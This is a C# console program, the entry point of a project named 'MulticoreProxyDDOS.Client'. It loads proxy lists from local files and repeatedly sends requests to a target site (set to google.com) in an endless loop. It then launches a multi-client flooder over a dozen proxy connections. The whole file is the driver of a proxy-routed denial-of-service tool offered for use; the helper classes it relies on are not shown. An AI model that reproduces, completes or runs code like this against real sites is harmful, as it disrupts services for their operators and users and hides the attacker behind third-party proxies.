using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using Tools;
using Tools.ProxyParsers;
using Console = CustomConsole.Console;

namespace MulticoreProxyDDOS.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            string target = "https://www.google.com/";

            List<ProxyData> proxies;

            // Load proxies
            {
                List<ProxyData> proxyData1 = ProxyChecker.LoadProxies(
                    @"C:\Users\Maxim\Documents\Source\web\prox\good\socks5.csv",
                    new IpProxyParser());

                List<ProxyData> proxyData = ProxyChecker.LoadProxies(
                    @"C:\Users\Maxim\Documents\Source\web\prox\good\proxies_24.03.2022.txt",
                    new Sosks5ProxyParser());

                proxies = proxyData;
            }


            // test
            {
                ProxyClient client = ProxyChecker.ConnectProxy(proxies, ProxyDdoser.Output);

                Console.WriteLine(client==null?"Failed to connect":"Connected");

                if (client != null)
                {

                    while (true)
                    {
                        ProxyDdoser.TryGet(client, target);

                        //Console.ReadLine();
                    }
                }
                else
                {
                    return;
                }
            }

            Console.ReadLine();


            using (ProxyDdoser ddoser = new ProxyDdoser(target))
            {
                ddoser.ConnectClients(proxies, 12);

                bool menu = true;

                while (menu)
                {
                    string cmd = Console.ReadLine();

                    switch (cmd)
                    {
                        case "uri":
                            Console.WriteLine("Input uri");
                            string uri = Console.ReadLine();
                            ddoser.TryGet(uri);
                            break;
                        case "run":
                            menu = false;
                            break;
                    }
                }


                ddoser.Run();

                Console.WriteLine("Press to stop");

                Console.ReadLine();
            }

            Console.ReadLine();
        }





        private static bool Ping(DdosMachine ddos, string host)
        {
            Console.WriteLine($"Ping proxy server:{host}");

            PingReply reply = ddos.Ping(host);

            Console.WriteLine($"Address : {reply.Address}\t{reply.Status}\t{reply.RoundtripTime}ms");

            return reply.Status == IPStatus.Success;
        }




    }
}
